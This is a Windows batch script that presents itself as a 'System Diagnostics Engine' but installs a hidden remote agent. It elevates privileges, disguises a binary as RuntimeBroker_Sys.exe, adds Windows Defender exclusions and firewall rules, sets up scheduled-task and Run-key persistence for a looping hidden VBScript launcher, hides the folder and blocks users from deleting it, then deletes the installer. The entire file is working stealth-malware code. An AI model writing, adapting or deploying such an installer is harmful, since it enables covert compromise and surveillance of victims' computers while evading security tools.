@echo off
title System Diagnostics Engine
color 0A

:: 1. Force Administrator Elevation
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [!] Requesting Full System Permissions...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /B
)
pushd "%CD%"
CD /D "%~dp0"

:: 2. Core Configurations
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
:: Ensure you change this to your actual server IP if it changes!
set "SERVER_URL="

echo [1/8] Removing File Blocks (Mark of the Web)...
:: This fixes the "Operation canceled by user" service.vbs error completely
powershell -NoProfile -Command "Get-ChildItem -Path '%~dp0' -Recurse | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1

echo [2/8] Preparing Environment...
taskkill /F /IM "%BIN_NAME%" >nul 2>&1
taskkill /F /IM "wscript.exe" >nul 2>&1
taskkill /F /IM "ScreenCap.exe" >nul 2>&1
taskkill /F /IM "teram_agent.exe" >nul 2>&1
schtasks /Delete /TN "MicrosoftWindowsHealthMonitor" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1

:: Unlock destination folder first if it exists from a previous install
if exist "%INSTALL_DIR%" (
    attrib -h -s "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo [3/8] Copying Core Files to Vault...
xcopy /E /I /Q /Y /H . "%INSTALL_DIR%" >nul 2>&1

:: Force recompile of the ScreenCap driver on next start
if exist "%INSTALL_DIR%\ScreenCap.exe" del /F /Q "%INSTALL_DIR%\ScreenCap.exe"

:: Set up the proper executable
if exist node.exe (
    copy /Y node.exe "%INSTALL_DIR%\%BIN_NAME%" >nul
) else if exist teram_agent.exe (
    copy /Y teram_agent.exe "%INSTALL_DIR%\%BIN_NAME%" >nul
) else (
    echo [ERROR] Core binary missing! Please ensure it's in the same folder.
    pause & exit
)

echo [4/8] Configuring Windows Defender ^& Firewall...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul

echo [5/8] Generating Silent Execution Service...
:: Using VBScript to ensure absolutely NO windows are visible
(
 echo Set W = CreateObject^("WScript.Shell"^)
 echo W.CurrentDirectory = "%INSTALL_DIR%"
 echo Do
 echo   W.Run chr^(34^) ^& "%INSTALL_DIR%\%BIN_NAME%" ^& chr^(34^) ^& " index.js %SERVER_URL%", 0, True
 echo   WScript.Sleep 5000
 echo Loop
) > "%INSTALL_DIR%\service.vbs"

echo [6/8] Registering Persistence...
schtasks /Create /TN "MicrosoftWindowsHealthMonitor" /TR "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul

echo [7/8] Engaging Stealth Protocols...
:: Hide the entire installation directory
attrib +h +s "%INSTALL_DIR%" /D
attrib +h +s "%INSTALL_DIR%\%BIN_NAME%"
attrib +h +s "%INSTALL_DIR%\service.vbs"

:: Lock the folder to prevent standard users from deleting it
icacls "%INSTALL_DIR%" /deny Everyone:(DE,WDAC) /T /C /Q >nul 2>&1

echo [8/8] Starting Service...
start "" wscript.exe "%INSTALL_DIR%\service.vbs"

echo.
echo ===================================================
echo    DEPLOYMENT SUCCESSFUL
echo ===================================================
echo    Agent is completely hidden and running silently.
echo    System protected and firewalls configured.
echo.
echo    Self-Destructing Installer in 5 seconds...
timeout /t 5 >nul
(
echo @echo off
echo timeout /t 2 ^>nul
echo rmdir /S /Q "%~dp0"
echo del "%%~f0"
) > "%TEMP%\del_agent.bat"
start "" /b "%TEMP%\del_agent.bat"
exit
